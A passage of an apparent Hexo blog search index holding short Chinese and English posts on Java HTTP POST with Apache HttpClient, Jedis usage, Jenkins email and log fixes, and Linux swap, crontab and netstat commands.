  </entry>
  <entry>
    <title>Java使用RestfulApi:POST</title>
    <url>/posts/53deaee0/</url>
    <content><![CDATA[<h3 id="Java使用RestfulApi-POST"><a href="#Java使用RestfulApi-POST" class="headerlink" title="Java使用RestfulApi-POST"></a>Java使用RestfulApi-POST</h3><span id="more"></span>
<h3 id="pom-xml設定"><a href="#pom-xml設定" class="headerlink" title="pom.xml設定"></a>pom.xml設定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;!-- apache http --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;httpclient&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;4.5.3&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h3 id="post-method-1"><a href="#post-method-1" class="headerlink" title="post method-1"></a>post method-1</h3><p>get方法，傳入uri、params、headers、retry、timeout參數。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static Optional&lt;String&gt; post(String uri, Map&lt;String, String&gt; params, List&lt;Header&gt; headers, int retry,</span><br><span class="line">	int <span class="built_in">timeout</span>) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (int i = retry; i &gt; 0; i--) &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			HttpPostRequest request = ApacheHttpClientManager.getInstance().getHttpPostRequest(uri);</span><br><span class="line">			request.setParameters(params);</span><br><span class="line">			<span class="keyword">if</span> (headers != null) &#123;</span><br><span class="line">				request.setHeaders(headers);</span><br><span class="line">			&#125;</span><br><span class="line">			request.setTimeout(<span class="built_in">timeout</span>);</span><br><span class="line">			HTTPResponse httPResponse = ApacheHttpClientManager.getInstance().execute(request);</span><br><span class="line">			<span class="built_in">return</span> Optional.ofNullable(httPResponse.getContent());</span><br><span class="line"></span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			<span class="keyword">if</span> (1 == i) &#123;</span><br><span class="line">				LogUtils.error.error(e.getMessage());</span><br><span class="line">				throw e;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span> Optional.empty();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="post-method-2"><a href="#post-method-2" class="headerlink" title="post method-2"></a>post method-2</h3><p>get方法，傳入uri、jsonString、headers、retry、timeout參數。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static Optional&lt;String&gt; post(String uri, String jsonString, List&lt;Header&gt; headers, int retry, int <span class="built_in">timeout</span>)</span><br><span class="line">	throws Exception &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (int i = retry; i &gt; 0; i--) &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			HttpPostRequest request = ApacheHttpClientManager.getInstance().getHttpPostRequest(uri);</span><br><span class="line">			request.setStringEntity(jsonString);</span><br><span class="line">			<span class="keyword">if</span> (headers != null) &#123;</span><br><span class="line">				request.setHeaders(headers);</span><br><span class="line">			&#125;</span><br><span class="line">			request.setTimeout(<span class="built_in">timeout</span>);</span><br><span class="line">			HTTPResponse httPResponse = ApacheHttpClientManager.getInstance().execute(request);</span><br><span class="line">			<span class="built_in">return</span> Optional.ofNullable(httPResponse.getContent());</span><br><span class="line"></span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			<span class="keyword">if</span> (1 == i) &#123;</span><br><span class="line">				LogUtils.error.error(e.getMessage());</span><br><span class="line">				throw e;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> Optional.empty();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ApacheHttpClientManager"><a href="#ApacheHttpClientManager" class="headerlink" title="ApacheHttpClientManager"></a>ApacheHttpClientManager</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public HttpPostRequest getHttpPostRequest(String url) throws Exception &#123;</span><br><span class="line">	<span class="built_in">return</span> new HttpPostRequest(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public HTTPResponse execute(HttpPostRequest request) throws Exception &#123;</span><br><span class="line">	String url = request.getUrl();</span><br><span class="line">	Header[] headers = request.getHeaders();</span><br><span class="line">	HttpEntity httpEntity = request.getHttpEntity();</span><br><span class="line">	HttpClientContext proxyHttpContext = request.getHttpContext();</span><br><span class="line"></span><br><span class="line">	HttpPost httpPost = new HttpPost(url);</span><br><span class="line">	httpPost.setHeader(<span class="string">&quot;Accept-Charset&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">	httpPost.setProtocolVersion(HttpVersion.HTTP_1_1);</span><br><span class="line">	<span class="keyword">if</span> (headers != null &amp;&amp; headers.length &gt; 0) &#123;</span><br><span class="line">		httpPost.setHeaders(headers);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (httpEntity != null) &#123;</span><br><span class="line">		httpPost.setEntity(httpEntity);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RequestConfig requestConfig = request.getRequestConfig();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (requestConfig != null) &#123;</span><br><span class="line">		httpPost.setConfig(requestConfig);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseableHttpResponse response = null;</span><br><span class="line">	String content = null;</span><br><span class="line">	Header[] responseHeaders = null;</span><br><span class="line">	int statusCode = -1;</span><br><span class="line">	CookieStore cookieStore = null;</span><br><span class="line">	try &#123;</span><br><span class="line">		<span class="keyword">if</span> (proxyHttpContext != null) &#123;</span><br><span class="line">			response = httpClient.execute(httpPost, proxyHttpContext);</span><br><span class="line">			<span class="keyword">if</span> (request.receiveCookie()) &#123;</span><br><span class="line">				cookieStore = proxyHttpContext.getCookieStore();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (request.receiveCookie()) &#123;</span><br><span class="line">				HttpClientContext httpClientContext = HttpClientContext.create();</span><br><span class="line">				response = httpClient.execute(httpPost, httpClientContext);</span><br><span class="line">				cookieStore = httpClientContext.getCookieStore();</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				response = httpClient.execute(httpPost);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		responseHeaders = response.getAllHeaders();</span><br><span class="line">		statusCode = response.getStatusLine().getStatusCode();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (statusCode != 200 &amp;&amp; statusCode != 404) &#123;</span><br><span class="line">			log.info(<span class="string">&quot;HTTP Status-Code (&quot;</span> + statusCode + <span class="string">&quot;) Length w/o headers: [&quot;</span> + url.length() + <span class="string">&quot;] &quot;</span></span><br><span class="line">				+ url);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		HttpEntity entity = response.getEntity();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (entity != null) &#123;</span><br><span class="line">			content = getResponse(entity);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; catch (Exception e) &#123;</span><br><span class="line">		log.error(e.getMessage(), e);</span><br><span class="line">		httpPost.abort();</span><br><span class="line">		throw e;</span><br><span class="line">	&#125; finally &#123;</span><br><span class="line">		close(response);</span><br><span class="line">		<span class="keyword">if</span> (httpPost != null) &#123;</span><br><span class="line">			httpPost.releaseConnection();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> new HTTPResponse(statusCode, content, responseHeaders,</span><br><span class="line">		(cookieStore == null ? null : cookieStore.getCookies()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>POST</tag>
        <tag>RestfulApi</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro to Jedis Part 1</title>
    <url>/posts/e355b94c/</url>
    <content><![CDATA[<h2 id="Intro-to-Jedis-Part-1"><a href="#Intro-to-Jedis-Part-1" class="headerlink" title="Intro to Jedis Part 1"></a>Intro to Jedis Part 1</h2><span id="more"></span>
<p>Jedis is a client library in Java for Redis.<br>The popular in-memory data structure store that can persist on disk as well.</p>
<h2 id="Maven-Dependencies"><a href="#Maven-Dependencies" class="headerlink" title="Maven Dependencies:"></a>Maven Dependencies:</h2><dependency>
    <groupId>redis.clients</groupId>
    <artifactId>jedis</artifactId>
    <version>3.3.0</version>
</dependency>

<h2 id="Redis-Installation"><a href="#Redis-Installation" class="headerlink" title="Redis Installation:"></a>Redis Installation:</h2><p>You will need to install and fire up one of the latest versions of Redis.<br>We are running the latest stable version at this moment (3.2.1), but any post 3.x version should be okay.</p>
<p>After that we can directly dive in and connect to it from our Java code:<br>Jedis jedis &#x3D; new Jedis();</p>
<h2 id="Strings"><a href="#Strings" class="headerlink" title="Strings:"></a>Strings:</h2><p>Strings are the most basic kind of Redis value, useful for when you need to persist simple key-value data types:<br>jedis.set(“events&#x2F;city&#x2F;ip”, “55.44.33.22”);<br>String cachedResponse &#x3D; jedis.get(“events&#x2F;city&#x2F;ip”);</p>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists:"></a>Lists:</h2><p>Redis Lists are simply lists of strings, sorted by insertion order and make it an ideal tool to implement, for instance, message queues:<br>jedis.lpush(“queue#tasks”, “firstTask”);<br>jedis.lpush(“queue#tasks”, “secondTask”);</p>
<p>String task &#x3D; jedis.rpop(“queue#tasks”);<br>The variable task will hold the value firstTask. Remember that you can serialize any object and persist it as a string,<br>so messages in the queue can carry more complex data when required.</p>
<h2 id="Sets"><a href="#Sets" class="headerlink" title="Sets:"></a>Sets:</h2><p>Redis Sets are an unordered collection of Strings that come in handy when you want to exclude repeated members:<br>jedis.sadd(“nicknames”, “nickname#1”);<br>jedis.sadd(“nicknames”, “nickname#2”);<br>jedis.sadd(“nicknames”, “nickname#1”);</p>
<p>Set<String> nicknames &#x3D; jedis.smembers(“nicknames”);<br>boolean exists &#x3D; jedis.sismember(“nicknames”, “nickname#1”);<br>The Java Set nicknames will have a size of 2, the second addition of nickname#1 was ignored.<br>Also, the exists variable will have a value of true, the method sismember enables you to check for the existence of a particular member quickly.</p>
<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes:"></a>Hashes:</h2><p>Redis Hashes are mapping between String fields and String values:<br>jedis.hset(“user#1”, “name”, “Peter”);<br>jedis.hset(“user#1”, “job”, “politician”);</p>
<p>String name &#x3D; jedis.hget(“user#1”, “name”);</p>
<p>Map&lt;String, String&gt; fields &#x3D; jedis.hgetAll(“user#1”);<br>String job &#x3D; fields.get(“job”);<br>As you can see, hashes are a very convenient data type when you want to access object’s properties individually<br>since you do not need to retrieve the whole object.</p>
<h2 id="Sorted-Sets"><a href="#Sorted-Sets" class="headerlink" title="Sorted Sets:"></a>Sorted Sets:</h2><p>Sorted Sets are like a Set where each member has an associated ranking, that is used for sorting them:<br>Map&lt;String, Double&gt; scores &#x3D; new HashMap&lt;&gt;();</p>
<p>scores.put(“PlayerOne”, 3000.0);<br>scores.put(“PlayerTwo”, 1500.0);<br>scores.put(“PlayerThree”, 8200.0);</p>
<p>scores.entrySet().forEach(playerScore -&gt; {<br>    jedis.zadd(key, playerScore.getValue(), playerScore.getKey());<br>});</p>
<p>String player &#x3D; jedis.zrevrange(“ranking”, 0, 1).iterator().next();<br>long rank &#x3D; jedis.zrevrank(“ranking”, “PlayerOne”);</p>
<p>The variable player will hold the value PlayerThree because we are retrieving the top 1 player and he is the one with the highest score.<br>The rank variable will have a value of 1 because PlayerOne is the second in the ranking and the ranking is zero-based.</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Jedis</tag>
      </tags>
  </entry>
  <entry>
    <title>Jenkins升級2.277.1在AutoBuild後，寄送Email的Template格式發生錯誤</title>
    <url>/posts/cacfe347/</url>
    <content><![CDATA[<h3 id="Jenkins升級2-277-1在AutoBuild後，寄送Email的Template格式發生錯誤"><a href="#Jenkins升級2-277-1在AutoBuild後，寄送Email的Template格式發生錯誤" class="headerlink" title="Jenkins升級2.277.1在AutoBuild後，寄送Email的Template格式發生錯誤"></a>Jenkins升級2.277.1在AutoBuild後，寄送Email的Template格式發生錯誤</h3><span id="more"></span>
<p>這篇介紹Jenkins升級2.277.1在AutoBuild後，寄送Email的Template格式發生錯誤解決方法。</p>
<h3 id="JENKINS"><a href="#JENKINS" class="headerlink" title="JENKINS"></a>JENKINS</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">JENKINS-65242</span><br><span class="line">Email extension plugin not able to resolve the environment variables</span><br><span class="line">content:</span><br><span class="line">I am using email-ext <span class="keyword">for</span> sending emails after every build. My jenkins version got updated to v 2.277.1 .</span><br><span class="line">After the update, I updated the email-ext plugin to 2.82 version. After all these updates, the email ext plugin is not able to resolve the environment variables .</span><br><span class="line">Say we use the subject : <span class="string">&#x27;$PROJECT_NAME - Build # $BUILD_NUMBER - $BUILD_STATUS!&#x27;</span></span><br><span class="line">The plugin used to resolve these variables before the update, but now, we are getting the subject as it is.</span><br><span class="line"></span><br><span class="line">The solution is to update Token Macro to 2.14 or later. See the ASM update section of the Jenkins LTS 2.277.x upgrade guide.</span><br></pre></td></tr></table></figure>

<h3 id="ASM-update"><a href="#ASM-update" class="headerlink" title="ASM update"></a>ASM update</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Jenkins 2.277.1 updates the ASM Java bytecode manipulation and analysis framework that is used <span class="keyword">for</span> bytecode processing <span class="keyword">in</span> many plugins.</span><br><span class="line">This update affects plugins that depend on ASM <span class="keyword">for</span> bytecode processing.</span><br><span class="line">Some older plugin releases may report a RuntimeException with the message <span class="string">&quot;Error creating extended parser class&quot;</span> (like Token Macro plugin).</span><br><span class="line">Other older plugin releases may fail to interpret existing settings (like Email Extension plugin).</span><br><span class="line"></span><br><span class="line">Use the Plugin Manager to update plugins affected by the ASM update after upgrading to Jenkins 2.277.1.</span><br><span class="line"></span><br><span class="line">請記得將Token Macro plugin升級成2.15版本，寄Email即正常。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Jenkins</category>
      </categories>
      <tags>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>Jenkins告警Logs造成硬碟不夠用</title>
    <url>/posts/458d60b2/</url>
    <content><![CDATA[<h3 id="Jenkins告警Logs造成硬碟不夠用"><a href="#Jenkins告警Logs造成硬碟不夠用" class="headerlink" title="Jenkins告警Logs造成硬碟不夠用"></a>Jenkins告警Logs造成硬碟不夠用</h3><span id="more"></span>
<p>這篇介紹Jenkins告警Logs造成硬碟不夠用如何解決。</p>
<h3 id="設定步驟"><a href="#設定步驟" class="headerlink" title="設定步驟"></a>設定步驟</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Jenkins -&gt; 管理Jenkins -&gt; 系統紀錄 -&gt; 紀錄等級</span><br><span class="line"></span><br><span class="line">調整等級</span><br><span class="line">輸入名稱:javax.jmdns 等級:off</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/jenkinslogsetting.PNG" width="50%" />

<h3 id="刪除logs-gt-重啟Jenkins"><a href="#刪除logs-gt-重啟Jenkins" class="headerlink" title="刪除logs -&gt; 重啟Jenkins"></a>刪除logs -&gt; 重啟Jenkins</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /var/log/jenkins/</span><br><span class="line">$ <span class="built_in">rm</span> *.<span class="built_in">log</span>  (刪除大檔案</span><br><span class="line">重啟Jenkins</span><br><span class="line">- 瀏覽器打上 http://&#123;ip&#125;:&#123;port&#125;/restart 即可重啟</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Jenkins</category>
      </categories>
      <tags>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>Jenkins設定EmailNotification</title>
    <url>/posts/1845897f/</url>
    <content><![CDATA[<h3 id="Jenkins設定EmailNotification"><a href="#Jenkins設定EmailNotification" class="headerlink" title="Jenkins設定EmailNotification"></a>Jenkins設定EmailNotification</h3><span id="more"></span>
<p>通常在Jenkins上設定完每日建置專案後，需要設定EmailNotification<br>來通知相關人員bulid的結果，這篇教如何設定EmailNotification</p>
<h3 id="設定步驟"><a href="#設定步驟" class="headerlink" title="設定步驟"></a>設定步驟</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Jenkins&gt;&gt;專案名稱&gt;&gt;組態</span><br><span class="line">1-1.上方Tab選擇建置設定將電子郵件通知(打勾</span><br><span class="line">1-2.Recipients-&gt;key上接收人員的Email(多位請,分隔)</span><br><span class="line">1-3.Send e-mail <span class="keyword">for</span> every unstable build	</span><br><span class="line">1-4.Send separate e-mails to individuals <span class="built_in">who</span> broke the build(打勾</span><br><span class="line">1-5.Send e-mail <span class="keyword">for</span> each failed module(打勾</span><br><span class="line">2-1.上方Tab選擇建置後動作&gt;&gt;可編式電子郵件通知&gt;&gt;專案收件人清單，要key上接收人員的Email(多位請,分隔)</span><br><span class="line">2-2.建置後動作&gt;&gt;Advanced Settings...&gt;&gt;Triggers&gt;&gt; 1.Failure - Any Send To <span class="string">&#x27;Recipient List&#x27;</span> and Always Send To <span class="string">&#x27;Recipient List&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="建置設定圖示"><a href="#建置設定圖示" class="headerlink" title="建置設定圖示"></a>建置設定圖示</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/建置設定.PNG" width="50%" />


<h3 id="建置後動作-gt-Advanced-Settings…-gt-Triggers"><a href="#建置後動作-gt-Advanced-Settings…-gt-Triggers" class="headerlink" title="建置後動作 &gt; Advanced Settings… &gt; Triggers"></a>建置後動作 &gt; Advanced Settings… &gt; Triggers</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/Triggers.PNG" width="50%" />
]]></content>
      <categories>
        <category>Jenkins</category>
      </categories>
      <tags>
        <tag>EmailNotification</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro to Jedis Part 2</title>
    <url>/posts/7a5ce8f6/</url>
    <content><![CDATA[<h3 id="Intro-to-Jedis-Part-2"><a href="#Intro-to-Jedis-Part-2" class="headerlink" title="Intro to Jedis Part 2"></a>Intro to Jedis Part 2</h3><span id="more"></span>

<h3 id="Transactions"><a href="#Transactions" class="headerlink" title="Transactions"></a>Transactions</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Transactions guarantee atomicity and thread safety operations, <span class="built_in">which</span> means that requests </span><br><span class="line">from other clients will never be handled concurrently during Redis transactions:</span><br><span class="line">String friendsPrefix = <span class="string">&quot;friends#&quot;</span>;</span><br><span class="line">String userOneId = <span class="string">&quot;4352523&quot;</span>;</span><br><span class="line">String userTwoId = <span class="string">&quot;5552321&quot;</span>;</span><br><span class="line"> </span><br><span class="line">Transaction t = jedis.multi();</span><br><span class="line">t.sadd(friendsPrefix + userOneId, userTwoId);</span><br><span class="line">t.sadd(friendsPrefix + userTwoId, userOneId);</span><br><span class="line">t.exec();</span><br><span class="line"></span><br><span class="line">You can even make a transaction success dependent on a specific key </span><br><span class="line">by <span class="string">&quot;watching&quot;</span> it right before you instantiate your Transaction:</span><br></pre></td></tr></table></figure>

<h3 id="Pipelining"><a href="#Pipelining" class="headerlink" title="Pipelining"></a>Pipelining</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">When we have to send multiple commands, we can pack them together <span class="keyword">in</span> one request and save connection overhead by using pipelines,</span><br><span class="line">it is essentially a network optimization. As long as the operations are mutually independent, we can take advantage of this technique:</span><br><span class="line">String userOneId = <span class="string">&quot;4352523&quot;</span>;</span><br><span class="line">String userTwoId = <span class="string">&quot;4849888&quot;</span>;</span><br><span class="line"> </span><br><span class="line">Pipeline p = jedis.pipelined();</span><br><span class="line">p.sadd(<span class="string">&quot;searched#&quot;</span> + userOneId, <span class="string">&quot;paris&quot;</span>);</span><br><span class="line">p.zadd(<span class="string">&quot;ranking&quot;</span>, 126, userOneId);</span><br><span class="line">p.zadd(<span class="string">&quot;ranking&quot;</span>, 325, userTwoId);</span><br><span class="line">Response&lt;Boolean&gt; pipeExists = p.sismember(<span class="string">&quot;searched#&quot;</span> + userOneId, <span class="string">&quot;paris&quot;</span>);</span><br><span class="line">Response&lt;Set&lt;String&gt;&gt; pipeRanking = p.zrange(<span class="string">&quot;ranking&quot;</span>, 0, -1);</span><br><span class="line">p.sync();</span><br><span class="line"> </span><br><span class="line">String exists = pipeExists.get();</span><br><span class="line">Set&lt;String&gt; ranking = pipeRanking.get();</span><br><span class="line"></span><br><span class="line">Notice we <span class="keyword">do</span> not get direct access to the <span class="built_in">command</span> responses, instead, we<span class="string">&#x27;re given a Response instance </span></span><br><span class="line"><span class="string">from which we can request the underlying response after the pipeline has been synced.</span></span><br></pre></td></tr></table></figure>

<h3 id="Publish-x2F-Subscribe"><a href="#Publish-x2F-Subscribe" class="headerlink" title="Publish&#x2F;Subscribe"></a>Publish&#x2F;Subscribe</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">*Subscriber</span><br><span class="line">Subscribe and listen to messages sent to a channel:</span><br><span class="line"></span><br><span class="line">Jedis jSubscriber = new Jedis();</span><br><span class="line">jSubscriber.subscribe(new <span class="function"><span class="title">JedisPubSub</span></span>() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void onMessage(String channel, String message) &#123;</span><br><span class="line">        // handle message</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="string">&quot;channel&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Publisher</span><br><span class="line">Then simply send messages to that same channel from the publisher<span class="string">&#x27;s thread:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Jedis jPublisher = new Jedis();</span></span><br><span class="line"><span class="string">jPublisher.publish(&quot;channel&quot;, &quot;test message&quot;);</span></span><br></pre></td></tr></table></figure>

<h3 id="Connection-Pooling"><a href="#Connection-Pooling" class="headerlink" title="Connection Pooling"></a>Connection Pooling</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">A pool that is thread safe and reliable as long as you <span class="built_in">return</span> the resource to the pool when you are <span class="keyword">done</span> with it.</span><br><span class="line">Let<span class="string">&#x27;s create the JedisPool:</span></span><br><span class="line"><span class="string">---------------------------</span></span><br><span class="line"><span class="string">final JedisPoolConfig poolConfig = buildPoolConfig();</span></span><br><span class="line"><span class="string">JedisPool jedisPool = new JedisPool(poolConfig, &quot;localhost&quot;);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">private JedisPoolConfig buildPoolConfig() &#123;</span></span><br><span class="line"><span class="string">    final JedisPoolConfig poolConfig = new JedisPoolConfig();</span></span><br><span class="line"><span class="string">    poolConfig.setMaxTotal(128);</span></span><br><span class="line"><span class="string">    poolConfig.setMaxIdle(128);</span></span><br><span class="line"><span class="string">    poolConfig.setMinIdle(16);</span></span><br><span class="line"><span class="string">    poolConfig.setTestOnBorrow(true);</span></span><br><span class="line"><span class="string">    poolConfig.setTestOnReturn(true);</span></span><br><span class="line"><span class="string">    poolConfig.setTestWhileIdle(true);</span></span><br><span class="line"><span class="string">    poolConfig.setMinEvictableIdleTimeMillis(Duration.ofSeconds(60).toMillis());</span></span><br><span class="line"><span class="string">    poolConfig.setTimeBetweenEvictionRunsMillis(Duration.ofSeconds(30).toMillis());</span></span><br><span class="line"><span class="string">    poolConfig.setNumTestsPerEvictionRun(3);</span></span><br><span class="line"><span class="string">    poolConfig.setBlockWhenExhausted(true);</span></span><br><span class="line"><span class="string">    return poolConfig;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now we can make use of our pool from anywhere in the application when needed:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">try (Jedis jedis = jedisPool.getResource()) &#123;</span></span><br><span class="line"><span class="string">    // do operations with jedis resource</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">We used the Java try-with-resources statement to avoid having to manually close the Jedis resource,</span></span><br><span class="line"><span class="string">but if you cannot use this statement you can also close the resource manually in the finally clause.</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Jedis</tag>
      </tags>
  </entry>
  <entry>
    <title>How to free Linux Swap Memory</title>
    <url>/posts/69c937af/</url>
    <content><![CDATA[<h3 id="How-to-free-Linux-Swap-Memory"><a href="#How-to-free-Linux-Swap-Memory" class="headerlink" title="How to free Linux Swap Memory"></a>How to free Linux Swap Memory</h3><span id="more"></span>
<p>這篇介紹How to free Linux Swap Memory。</p>
<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Shell script:</span><br><span class="line"></span><br><span class="line">Swap=`free -k |grep Swap|awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>`</span><br><span class="line">Mem=`free -k |grep Mem|awk <span class="string">&#x27;&#123;print $4&#125;&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$Swap</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;linux do not use swap.&quot;</span> &gt;&gt; /root/free_swap.log</span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$Swap</span> -ge <span class="variable">$Mem</span> ]; <span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;linux Swap usage is more than or equal to free memory.&quot;</span> &gt;&gt; /root/free_swap.log</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   free -m</span><br><span class="line">   <span class="built_in">sync</span>;<span class="built_in">sync</span>;<span class="built_in">sync</span>;<span class="built_in">sync</span>;<span class="built_in">sync</span></span><br><span class="line">   sudo /sbin/swapoff -a</span><br><span class="line">   sudo /sbin/swapon -a</span><br><span class="line">   free -m</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt;&gt; /root/free_swap.log</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Swap</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux crontab執行jar</title>
    <url>/posts/d90cf374/</url>
    <content><![CDATA[<h3 id="Linux-crontab執行jar"><a href="#Linux-crontab執行jar" class="headerlink" title="Linux crontab執行jar"></a>Linux crontab執行jar</h3><span id="more"></span>
<p>在linux下面執行java程式，一般情況下我們先打包成jar檔案，放在linux下，用crontab執行Shell script去執行jar檔。</p>
<h3 id="upload-sh"><a href="#upload-sh" class="headerlink" title="upload.sh"></a>upload.sh</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/java/jdk1.8.0_181-amd64</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"> </span><br><span class="line">java -jar /opt/local/test/DavidTest.jar</span><br></pre></td></tr></table></figure>

<h3 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">6,16,26,36,46,56 * * * * sh /root/deploy/upload.sh &gt;&gt; /root/deploy/upload.log</span><br></pre></td></tr></table></figure>

<h3 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">必須在upload.sh 匯入java的環境變數，為什麼要匯入這些內容，是因為crontab定時程式呼叫指令碼時，系統的環境變數是沒有載入的。</span><br><span class="line">其次執行jar的命令是java -jar 加jar檔名稱就可以了，這個命令是跨平臺的。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Crontab</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>jar</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Observe Tcp State</title>
    <url>/posts/98a7d4c0/</url>
    <content><![CDATA[<h3 id="Intro-Linux-Observe-Tcp-State"><a href="#Intro-Linux-Observe-Tcp-State" class="headerlink" title="Intro Linux Observe Tcp State"></a>Intro Linux Observe Tcp State</h3><span id="more"></span>
<p>這篇介紹Linux Observe Tcp State。</p>
<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ netstat -na | awk <span class="string">&#x27;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># netstat -na | awk &#x27;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#x27;</span></span><br><span class="line">LISTEN 2</span><br><span class="line">ESTABLISHED 2</span><br></pre></td></tr></table></figure>

